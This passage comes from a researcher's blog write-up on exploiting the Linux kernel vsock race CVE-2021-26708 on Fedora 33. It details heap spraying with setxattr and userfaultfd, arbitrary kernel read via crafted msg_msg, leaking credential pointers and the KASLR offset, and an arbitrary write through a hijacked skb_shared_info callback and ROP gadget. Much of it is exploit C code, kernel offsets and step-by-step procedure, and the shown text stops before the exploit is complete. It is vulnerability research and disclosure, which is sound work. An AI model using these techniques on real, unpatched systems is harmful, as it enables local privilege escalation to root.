<p>After achieving arbitrary free, I started to think about where to aim it—what could I free? Here I used the same trick as I did in the <a href="https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html">CVE-2019-18683 exploit</a>. As I mentioned earlier, the second <code class="language-plaintext highlighter-rouge">connect()</code> to the virtual socket calls <code class="language-plaintext highlighter-rouge">vsock_deassign_transport()</code>, which sets <code class="language-plaintext highlighter-rouge">vsk-&gt;transport</code> to NULL. That makes the vulnerable <code class="language-plaintext highlighter-rouge">vsock_stream_setsockopt()</code> show a kernel warning when it calls <code class="language-plaintext highlighter-rouge">virtio_transport_send_pkt_info()</code> just after the memory corruption:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
</code></pre></div></div>

<p>A quick debugging session with <code class="language-plaintext highlighter-rouge">gdb</code> showed that the <code class="language-plaintext highlighter-rouge">RCX</code> register contains the kernel address of the freed <code class="language-plaintext highlighter-rouge">virtio_vsock_sock</code> and the <code class="language-plaintext highlighter-rouge">RBX</code> register contains the kernel address of <code class="language-plaintext highlighter-rouge">vsock_sock</code>. Excellent! On Fedora I can open and parse <code class="language-plaintext highlighter-rouge">/dev/kmsg</code>: if one more warning appears in the kernel log, then the exploit won one more race and it can extract the corresponding kernel addresses from the registers.</p>

<center><img src="./2021 - Four Bytes of Power exploiting CVE-2021-26708 in the Linux kernel_files/telescope_weapon.jpg" width="65%"></center>
<p><br></p>

<h2 id="from-arbitrary-free-to-use-after-free">From arbitrary free to use-after-free</h2>

<p>My exploitation plan was to use arbitrary free for use-after-free:</p>

<ol>
  <li>Free an object at the kernel address leaked in the kernel warning.</li>
  <li>Perform heap spraying to overwrite that object with controlled data.</li>
  <li>Do privilege escalation using the corrupted object.</li>
</ol>

<p>At first, I wanted to exploit arbitrary free against the <code class="language-plaintext highlighter-rouge">vsock_sock</code> address (from <code class="language-plaintext highlighter-rouge">RBX</code>), because this is a big structure that contains a lot of interesting things. But that didn't work, since it lives in a dedicated slab cache where I can't perform heap spraying. So I don't know whether use-after-free exploitation on <code class="language-plaintext highlighter-rouge">vsock_sock</code> is possible.</p>

<p>Another option is to free the address from <code class="language-plaintext highlighter-rouge">RCX</code>. I started to search for a 64-byte kernel object that is interesting for use-after-free (containing kernel pointers, for example). Moreover, the exploit in the userspace should somehow make the kernel put that object at the location of the freed <code class="language-plaintext highlighter-rouge">virtio_vsock_sock</code>. Searching for a kernel object to fit these requirements was an enormous pain! I even used <strong>the input corpus of my fuzzer</strong> and automated that search.</p>

<p>In parallel, I was learning the internals of System V message implementation, since I had already used <code class="language-plaintext highlighter-rouge">msg_msg</code> for heap spraying in this exploit. And then I got an insight on how to exploit use-after-free on <code class="language-plaintext highlighter-rouge">msg_msg</code>.</p>

<h2 id="achieving-arbitrary-read">Achieving arbitrary read</h2>

<p>The kernel implementation of a System V message has maximum size <code class="language-plaintext highlighter-rouge">DATALEN_MSG</code>, which is <code class="language-plaintext highlighter-rouge">PAGE_SIZE</code> minus <code class="language-plaintext highlighter-rouge">sizeof(struct msg_msg))</code>. If you send a bigger message, the remainder is saved in a list of message segments. The <code class="language-plaintext highlighter-rouge">msg_msg</code> structure has <code class="language-plaintext highlighter-rouge">struct msg_msgseg *next</code>, which points to the first segment, and <code class="language-plaintext highlighter-rouge">size_t m_ts</code>, which stores the whole size.</p>

<p>Cool! I can put the controlled values in <code class="language-plaintext highlighter-rouge">msg_msg.m_ts</code> and <code class="language-plaintext highlighter-rouge">msg_msg.next</code> when I overwrite the message after executing arbitrary free for it:</p>

<center><img src="./2021 - Four Bytes of Power exploiting CVE-2021-26708 in the Linux kernel_files/overwritten_msg_msg.png" width="100%"></center>

<p>Note that I don't overwrite <code class="language-plaintext highlighter-rouge">msg_msg.security</code>, in order to avoid breaking SELinux permission checks. That is possible using the wonderful <code class="language-plaintext highlighter-rouge">setxattr() &amp; userfaultfd()</code> heap spraying <a href="https://duasynt.com/blog/linux-kernel-heap-spray">technique by Vitaly Nikolenko</a>. <strong>Tip:</strong> I place the spraying payload at the border of the page faulting memory region so that <code class="language-plaintext highlighter-rouge">copy_from_user()</code> hangs just before overwriting <code class="language-plaintext highlighter-rouge">msg_msg.security</code>. See the code preparing the payload:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define PAYLOAD_SZ 40
</span>
<span class="kt">void</span> <span class="nf">adapt_xattr_vs_sysv_msg_spray</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kaddr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">msg_msg</span> <span class="o">*</span><span class="n">msg_ptr</span><span class="p">;</span>

    <span class="n">xattr_addr</span> <span class="o">=</span> <span class="n">spray_data</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">-</span> <span class="n">PAYLOAD_SZ</span><span class="p">;</span>

    <span class="cm">/* Don't touch the second part to avoid breaking page fault delivery */</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">spray_data</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="n">PAGE_SIZE</span> <span class="o">*</span> <span class="mi">4</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] adapt the msg_msg spraying payload:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">msg_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">msg_msg</span> <span class="o">*</span><span class="p">)</span><span class="n">xattr_addr</span><span class="p">;</span>
    <span class="n">msg_ptr</span><span class="o">-&gt;</span><span class="n">m_type</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>
    <span class="n">msg_ptr</span><span class="o">-&gt;</span><span class="n">m_ts</span> <span class="o">=</span> <span class="n">ARB_READ_SZ</span><span class="p">;</span>
    <span class="n">msg_ptr</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">msg_msgseg</span> <span class="o">*</span><span class="p">)</span><span class="n">kaddr</span><span class="p">;</span> <span class="cm">/* set the segment ptr for arbitrary read */</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">msg_ptr %p</span><span class="se">\n\t</span><span class="s">m_type %lx at %p</span><span class="se">\n\t</span><span class="s">m_ts %zu at %p</span><span class="se">\n\t</span><span class="s">msgseg next %p at %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
           <span class="n">msg_ptr</span><span class="p">,</span>
           <span class="n">msg_ptr</span><span class="o">-&gt;</span><span class="n">m_type</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">msg_ptr</span><span class="o">-&gt;</span><span class="n">m_type</span><span class="p">),</span>
           <span class="n">msg_ptr</span><span class="o">-&gt;</span><span class="n">m_ts</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">msg_ptr</span><span class="o">-&gt;</span><span class="n">m_ts</span><span class="p">),</span>
           <span class="n">msg_ptr</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">msg_ptr</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>But how do we read the kernel data using this crafted <code class="language-plaintext highlighter-rouge">msg_msg</code>? Receiving this message requires manipulations with the System V message queue, which breaks the kernel because the <code class="language-plaintext highlighter-rouge">msg_msg.m_list</code> pointer is invalid (0xa5a5a5a5a5a5a5a5 in my case). My first idea was setting this pointer to the address of another good message, but that caused the kernel to hang because the message list traversal can't finish.</p>

<p>Reading the <a href="https://man7.org/linux/man-pages/man2/msgrcv.2.html">documentation</a> for the <code class="language-plaintext highlighter-rouge">msgrcv()</code> syscall helped to find a better solution: I used <code class="language-plaintext highlighter-rouge">msgrcv()</code> with the <code class="language-plaintext highlighter-rouge">MSG_COPY</code> flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
</code></pre></div></div>

<p>This flag makes the kernel copy the message data to the userspace without removing it from the message queue. Nice! <code class="language-plaintext highlighter-rouge">MSG_COPY</code> is available if the kernel has <code class="language-plaintext highlighter-rouge">CONFIG_CHECKPOINT_RESTORE=y</code>, which is true for Fedora Server.</p>

<center><img src="./2021 - Four Bytes of Power exploiting CVE-2021-26708 in the Linux kernel_files/pistol_weapon.jpg" width="80%"></center>
<p><br></p>

<h2 id="arbitrary-read-step-by-step-procedure">Arbitrary read: step-by-step procedure</h2>

<p>Here is the step-by-step procedure that my exploit uses for arbitrary read of kernel memory:</p>

<ol>
  <li>Make preparations:
    <ul>
      <li>Count CPUs available for racing using <code class="language-plaintext highlighter-rouge">sched_getaffinity()</code> and <code class="language-plaintext highlighter-rouge">CPU_COUNT()</code> (the exploit needs at least two).</li>
      <li>Open <code class="language-plaintext highlighter-rouge">/dev/kmsg</code> for parsing.</li>
      <li><code class="language-plaintext highlighter-rouge">mmap()</code> the <code class="language-plaintext highlighter-rouge">spray_data</code> memory area and configure <code class="language-plaintext highlighter-rouge">userfaultfd()</code> for the last part of it.</li>
      <li>Start a separate <code class="language-plaintext highlighter-rouge">pthread</code> for handling <code class="language-plaintext highlighter-rouge">userfaultfd()</code> events.</li>
      <li>Start 127 <code class="language-plaintext highlighter-rouge">pthreads</code> for <code class="language-plaintext highlighter-rouge">setxattr() &amp; userfaultfd()</code> heap spraying over <code class="language-plaintext highlighter-rouge">msg_msg</code> and hang them on a <code class="language-plaintext highlighter-rouge">pthread_barrier</code>.</li>
    </ul>
  </li>
  <li>Get the kernel address of a good <code class="language-plaintext highlighter-rouge">msg_msg</code>:
    <ul>
      <li>Win the race on a virtual socket, as described earlier.</li>
      <li>Wait for 35 microseconds in a busy loop after the second <code class="language-plaintext highlighter-rouge">connect()</code>.</li>
      <li>Call <code class="language-plaintext highlighter-rouge">msgsnd()</code> for a separate message queue; the <code class="language-plaintext highlighter-rouge">msg_msg</code> object is placed at the <code class="language-plaintext highlighter-rouge">virtio_vsock_sock</code> location <strong>after the memory corruption</strong>.</li>
      <li>Parse the kernel log and save the kernel address of this good <code class="language-plaintext highlighter-rouge">msg_msg</code> from the kernel warning (<code class="language-plaintext highlighter-rouge">RCX</code> register).</li>
      <li>Also, save the kernel address of the <code class="language-plaintext highlighter-rouge">vsock_sock</code> object from the <code class="language-plaintext highlighter-rouge">RBX</code> register.</li>
    </ul>
  </li>
  <li>Execute arbitrary free against good <code class="language-plaintext highlighter-rouge">msg_msg</code> using a corrupted <code class="language-plaintext highlighter-rouge">msg_msg</code>:
    <ul>
      <li>Use four bytes of the address of good <code class="language-plaintext highlighter-rouge">msg_msg</code> for <code class="language-plaintext highlighter-rouge">SO_VM_SOCKETS_BUFFER_SIZE</code>; that value will be used for the memory corruption.</li>
      <li>Win the race on a virtual socket.</li>
      <li>Call <code class="language-plaintext highlighter-rouge">msgsnd()</code> right after the second <code class="language-plaintext highlighter-rouge">connect()</code>; the <code class="language-plaintext highlighter-rouge">msg_msg</code> is placed at the <code class="language-plaintext highlighter-rouge">virtio_vsock_sock</code> location <strong>and corrupted</strong>.</li>
      <li>Now the <code class="language-plaintext highlighter-rouge">security</code> pointer of the corrupted <code class="language-plaintext highlighter-rouge">msg_msg</code> stores the address of the good <code class="language-plaintext highlighter-rouge">msg_msg</code> (from step 2). <center><br><img src="./2021 - Four Bytes of Power exploiting CVE-2021-26708 in the Linux kernel_files/corrupted_msg_msg.png" width="100%"></center><br></li>
      <li>If the memory corruption of <code class="language-plaintext highlighter-rouge">msg_msg.security</code> from the <code class="language-plaintext highlighter-rouge">setsockopt()</code> thread happens during <code class="language-plaintext highlighter-rouge">msgsnd()</code> handling, then the SELinux permission check fails.</li>
      <li>In that case, <code class="language-plaintext highlighter-rouge">msgsnd()</code> returns <code class="language-plaintext highlighter-rouge">-1</code> and the corrupted <code class="language-plaintext highlighter-rouge">msg_msg</code> is destroyed; freeing <code class="language-plaintext highlighter-rouge">msg_msg.security</code> frees the good <code class="language-plaintext highlighter-rouge">msg_msg</code>.</li>
    </ul>
  </li>
  <li>Overwrite the good <code class="language-plaintext highlighter-rouge">msg_msg</code> with a controlled payload:
    <ul>
      <li>Right after a failed <code class="language-plaintext highlighter-rouge">msgsnd()</code> the exploit calls <code class="language-plaintext highlighter-rouge">pthread_barrier_wait()</code>, which wakes 127 spraying <code class="language-plaintext highlighter-rouge">pthreads</code>.</li>
      <li>These <code class="language-plaintext highlighter-rouge">pthreads</code> execute <code class="language-plaintext highlighter-rouge">setxattr()</code> with a payload that has been prepared with <code class="language-plaintext highlighter-rouge">adapt_xattr_vs_sysv_msg_spray(vsock_kaddr)</code>, described earlier.</li>
      <li>Now the good <code class="language-plaintext highlighter-rouge">msg_msg</code> is overwritten with the controlled data and the <code class="language-plaintext highlighter-rouge">msg_msg.next</code> pointer to the System V message segment stores the address of the <code class="language-plaintext highlighter-rouge">vsock_sock</code> object.  <center><br><img src="./2021 - Four Bytes of Power exploiting CVE-2021-26708 in the Linux kernel_files/corrupted_and_overwritten_msg_msg.png" width="100%"></center><br></li>
    </ul>
  </li>
  <li>Read the contents of the <code class="language-plaintext highlighter-rouge">vsock_sock</code> kernel object to the userspace by receiving a message from the message queue that stores the overwritten <code class="language-plaintext highlighter-rouge">msg_msg</code>:
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ret</span> <span class="o">=</span> <span class="n">msgrcv</span><span class="p">(</span><span class="n">msg_locations</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">msq_id</span><span class="p">,</span> <span class="n">kmem</span><span class="p">,</span> <span class="n">ARB_READ_SZ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
                <span class="n">IPC_NOWAIT</span> <span class="o">|</span> <span class="n">MSG_COPY</span> <span class="o">|</span> <span class="n">MSG_NOERROR</span><span class="p">);</span>
</code></pre></div>    </div>
  </li>
</ol>

<p>This part of the exploit is very reliable.</p>

<h2 id="sorting-the-loot">Sorting the loot</h2>

<p>Now my "weapons" had given me some good loot: I got the contents of the <code class="language-plaintext highlighter-rouge">vsock_sock</code> kernel object. It took me some time to sort it out and find good attack targets for further exploit steps.</p>
<center><img src="./2021 - Four Bytes of Power exploiting CVE-2021-26708 in the Linux kernel_files/chest_loot.jpg" width="60%"></center>
<p><br></p>

<p>Here's what I found inside:</p>
<ul>
  <li>Plenty of pointers to objects from dedicated slab caches, such as <code class="language-plaintext highlighter-rouge">PINGv6</code> and <code class="language-plaintext highlighter-rouge">sock_inode_cache</code>. These are not interesting.</li>
  <li><code class="language-plaintext highlighter-rouge">struct mem_cgroup *sk_memcg</code> pointer living in <code class="language-plaintext highlighter-rouge">vsock_sock.sk</code> at offset <strong>664</strong>. The <code class="language-plaintext highlighter-rouge">mem_cgroup</code> structure is allocated in the <code class="language-plaintext highlighter-rouge">kmalloc-4k</code> slab cache. Good!</li>
  <li><code class="language-plaintext highlighter-rouge">const struct cred *owner</code> pointer living in <code class="language-plaintext highlighter-rouge">vsock_sock</code> at offset <strong>840</strong>. It stores the address of the credentials that I want to overwrite for privilege escalation.</li>
  <li><code class="language-plaintext highlighter-rouge">void (*sk_write_space)(struct sock *)</code> function pointer in <code class="language-plaintext highlighter-rouge">vsock_sock.sk</code> at offset <strong>688</strong>. It is set to the address of the <code class="language-plaintext highlighter-rouge">sock_def_write_space()</code> kernel function. That can be used for calculating the <code class="language-plaintext highlighter-rouge">KASLR</code> offset.</li>
</ul>

<p>Here is how the exploit extracts these pointers from the memory dump:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define MSG_MSG_SZ		48
#define DATALEN_MSG 		(PAGE_SIZE - MSG_MSG_SZ)
#define SK_MEMCG_OFFSET 	664
#define SK_MEMCG_RD_LOCATION	(DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET	840
#define OWNER_CRED_RD_LOCATION	(DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET	688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET)
</span>
<span class="cm">/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */</span>
<span class="cp">#define SOCK_DEF_WRITE_SPACE	0xffffffff819851b0lu
</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">sk_memcg</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">owner_cred</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">sock_def_write_space</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kaslr_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="cm">/* ... */</span>

    <span class="n">sk_memcg</span> <span class="o">=</span> <span class="n">kmem</span><span class="p">[</span><span class="n">SK_MEMCG_RD_LOCATION</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Found sk_memcg %lx (offset %ld in the leaked kmem)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
			<span class="n">sk_memcg</span><span class="p">,</span> <span class="n">SK_MEMCG_RD_LOCATION</span><span class="p">);</span>

    <span class="n">owner_cred</span> <span class="o">=</span> <span class="n">kmem</span><span class="p">[</span><span class="n">OWNER_CRED_RD_LOCATION</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Found owner cred %lx (offset %ld in the leaked kmem)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
			<span class="n">owner_cred</span><span class="p">,</span> <span class="n">OWNER_CRED_RD_LOCATION</span><span class="p">);</span>

    <span class="n">sock_def_write_space</span> <span class="o">=</span> <span class="n">kmem</span><span class="p">[</span><span class="n">SK_WRITE_SPACE_RD_LOCATION</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
			<span class="n">sock_def_write_space</span><span class="p">,</span> <span class="n">SK_WRITE_SPACE_RD_LOCATION</span><span class="p">);</span>

    <span class="n">kaslr_offset</span> <span class="o">=</span> <span class="n">sock_def_write_space</span> <span class="o">-</span> <span class="n">SOCK_DEF_WRITE_SPACE</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Calculated kaslr offset: %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kaslr_offset</span><span class="p">);</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">cred</code> structure is allocated in the dedicated <code class="language-plaintext highlighter-rouge">cred_jar</code> slab cache. Even if I execute my arbitrary free against it, I can't overwrite it with the controlled data (or at least I don't know how to). That's too bad, since it would be the best solution.</p>

<p>So I focused on the <code class="language-plaintext highlighter-rouge">mem_cgroup</code> object. I tried to call <code class="language-plaintext highlighter-rouge">kfree()</code> for it, but the kernel panicked instantly. Looks like the kernel uses this object quite intensively, alas. But here I remembered my good old privilege escalation tricks.</p>

<h2 id="use-after-free-on-sk_buff">Use-after-free on sk_buff</h2>

<p>When I <a href="https://a13xp0p0v.github.io/2017/03/24/CVE-2017-2636.html">exploited CVE-2017-2636</a> in the Linux kernel back in 2017, I turned double free for a <code class="language-plaintext highlighter-rouge">kmalloc-8192</code> object into use-after-free on <code class="language-plaintext highlighter-rouge">sk_buff</code>. I decided to repeat that trick.</p>

<p>A network-related buffer in the Linux kernel is represented by <code class="language-plaintext highlighter-rouge">struct sk_buff</code>. This object has <code class="language-plaintext highlighter-rouge">skb_shared_info</code> with <code class="language-plaintext highlighter-rouge">destructor_arg</code>, which can be used for control flow hijacking. The network data and <code class="language-plaintext highlighter-rouge">skb_shared_info</code> are placed <strong>in the same kernel memory block</strong> pointed to by <code class="language-plaintext highlighter-rouge">sk_buff.head</code>. Hence creating a 2800-byte network packet in the userspace will make <code class="language-plaintext highlighter-rouge">skb_shared_info</code> be allocated in the <code class="language-plaintext highlighter-rouge">kmalloc-4k</code> slab cache, where <code class="language-plaintext highlighter-rouge">mem_cgroup</code> objects live as well.</p>

<p>So I implemented the following procedure:</p>

<ol>
  <li>Create one client socket and 32 server sockets using <code class="language-plaintext highlighter-rouge">socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)</code>.</li>
  <li>Prepare a 2800-byte buffer in the userspace and do <code class="language-plaintext highlighter-rouge">memset()</code> with <strong>0x42</strong> for it.</li>
  <li>Send this buffer from the client socket to each server socket using <code class="language-plaintext highlighter-rouge">sendto()</code>. That creates <code class="language-plaintext highlighter-rouge">sk_buff</code> objects in <code class="language-plaintext highlighter-rouge">kmalloc-4k</code>. Do that on each available CPU using <code class="language-plaintext highlighter-rouge">sched_setaffinity()</code> (this is important because slab caches are per-CPU).</li>
  <li>Perform the arbitrary read procedure for <code class="language-plaintext highlighter-rouge">vsock_sock</code> (described earlier).</li>
  <li>Calculate the possible <code class="language-plaintext highlighter-rouge">sk_buff</code> kernel address as <code class="language-plaintext highlighter-rouge">sk_memcg</code> plus 4096 (the next element in <code class="language-plaintext highlighter-rouge">kmalloc-4k</code>).</li>
  <li>Perform the arbitrary read procedure for this possible <code class="language-plaintext highlighter-rouge">sk_buff</code> address.</li>
  <li>If <strong>0x4242424242424242lu</strong> is found at the location of network data, then the real <code class="language-plaintext highlighter-rouge">sk_buff</code> is found, go to <strong>step 8</strong>. Otherwise, add 4096 to the possible <code class="language-plaintext highlighter-rouge">sk_buff</code> address and go to <strong>step 6</strong>.</li>
  <li>Start 32 <code class="language-plaintext highlighter-rouge">pthreads</code> for <code class="language-plaintext highlighter-rouge">setxattr() &amp; userfaultfd()</code> heap spraying over <code class="language-plaintext highlighter-rouge">sk_buff</code> and hang them on a <code class="language-plaintext highlighter-rouge">pthread_barrier</code>.</li>
  <li>Perform arbitrary free against the <code class="language-plaintext highlighter-rouge">sk_buff</code> kernel address.</li>
  <li>Call <code class="language-plaintext highlighter-rouge">pthread_barrier_wait()</code>, which wakes 32 spraying <code class="language-plaintext highlighter-rouge">pthreads</code> that execute <code class="language-plaintext highlighter-rouge">setxattr()</code> overwriting <code class="language-plaintext highlighter-rouge">skb_shared_info</code>.</li>
  <li>Receive the network messages using <code class="language-plaintext highlighter-rouge">recv()</code> for the server sockets.</li>
</ol>

<p>When the <code class="language-plaintext highlighter-rouge">sk_buff</code> object with overwritten <code class="language-plaintext highlighter-rouge">skb_shared_info</code> is received, the kernel executes the <code class="language-plaintext highlighter-rouge">destructor_arg</code> callback, which performs an arbitrary write of kernel memory and escalates user privileges. <strong>How?</strong> Keep reading!</p>

<p>I should note that this part, with use-after-free on <code class="language-plaintext highlighter-rouge">sk_buff</code>, is the exploit's main source of instability. It would be nice to find a better kernel object that can be allocated in <code class="language-plaintext highlighter-rouge">kmalloc-*</code> slab caches and exploited for turning use-after-free into arbitrary read/write of kernel memory.</p>

<h2 id="arbitrary-write-with-skb_shared_info">Arbitrary write with skb_shared_info</h2>

<p>Let's look at the code that prepares the payload for overwriting the <code class="language-plaintext highlighter-rouge">sk_buff</code> object:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define SKB_SIZE		4096
#define SKB_SHINFO_OFFSET	3776
#define MY_UINFO_OFFSET		256
#define SKBTX_DEV_ZEROCOPY	(1 &lt;&lt; 3)
</span>
<span class="kt">void</span> <span class="nf">prepare_xattr_vs_skb_spray</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">skb_shared_info</span> <span class="o">*</span><span class="n">info</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="n">xattr_addr</span> <span class="o">=</span> <span class="n">spray_data</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">-</span> <span class="n">SKB_SIZE</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span>

    <span class="cm">/* Don't touch the second part to avoid breaking page fault delivery */</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">spray_data</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="n">PAGE_SIZE</span> <span class="o">*</span> <span class="mi">4</span><span class="p">);</span>

    <span class="n">info</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">skb_shared_info</span> <span class="o">*</span><span class="p">)(</span><span class="n">xattr_addr</span> <span class="o">+</span> <span class="n">SKB_SHINFO_OFFSET</span><span class="p">);</span>
    <span class="n">info</span><span class="o">-&gt;</span><span class="n">tx_flags</span> <span class="o">=</span> <span class="n">SKBTX_DEV_ZEROCOPY</span><span class="p">;</span>
    <span class="n">info</span><span class="o">-&gt;</span><span class="n">destructor_arg</span> <span class="o">=</span> <span class="n">uaf_write_value</span> <span class="o">+</span> <span class="n">MY_UINFO_OFFSET</span><span class="p">;</span>

    <span class="n">uinfo_p</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ubuf_info</span> <span class="o">*</span><span class="p">)(</span><span class="n">xattr_addr</span> <span class="o">+</span> <span class="n">MY_UINFO_OFFSET</span><span class="p">);</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">skb_shared_info</code> structure resides in the sprayed data exactly at the offset <code class="language-plaintext highlighter-rouge">SKB_SHINFO_OFFSET</code>, which is 3776 bytes. The <code class="language-plaintext highlighter-rouge">skb_shared_info.destructor_arg</code> pointer stores the address of <code class="language-plaintext highlighter-rouge">struct ubuf_info</code>. I create a fake <code class="language-plaintext highlighter-rouge">ubuf_info</code> at <code class="language-plaintext highlighter-rouge">MY_UINFO_OFFSET</code> in the network buffer itself. This is possible since the kernel address of the attacked <code class="language-plaintext highlighter-rouge">sk_buff</code> is known. Here is the payload layout:</p>

<center><img src="./2021 - Four Bytes of Power exploiting CVE-2021-26708 in the Linux kernel_files/skb_payload.png" width="85%"></center>
<p><br></p>

<p>Now about the <code class="language-plaintext highlighter-rouge">destructor_arg</code> callback:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cm">/*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */</span>
    <span class="n">uinfo_p</span><span class="o">-&gt;</span><span class="n">callback</span> <span class="o">=</span> <span class="n">ARBITRARY_WRITE_GADGET</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
    <span class="n">uinfo_p</span><span class="o">-&gt;</span><span class="n">desc</span> <span class="o">=</span> <span class="n">owner_cred</span> <span class="o">+</span> <span class="n">CRED_EUID_EGID_OFFSET</span><span class="p">;</span> <span class="cm">/* value for "qword ptr [rdi + 8]" */</span>
    <span class="n">uinfo_p</span><span class="o">-&gt;</span><span class="n">desc</span> <span class="o">=</span> <span class="n">uinfo_p</span><span class="o">-&gt;</span><span class="n">desc</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* rsi value 1 should not get into euid */</span>
</code></pre></div></div>

<p>I invented a very strange arbitrary write primitive that you can see here. I couldn't find a stack pivoting gadget in <code class="language-plaintext highlighter-rouge">vmlinuz-5.10.11-200.fc33.x86_64</code> that would work with my constraints… so I performed arbitrary write in one shot :)</p>

<center><img src="./2021 - Four Bytes of Power exploiting CVE-2021-26708 in the Linux kernel_files/cannon_weapon.jpg" width="85%"></center>
<p><br></p>

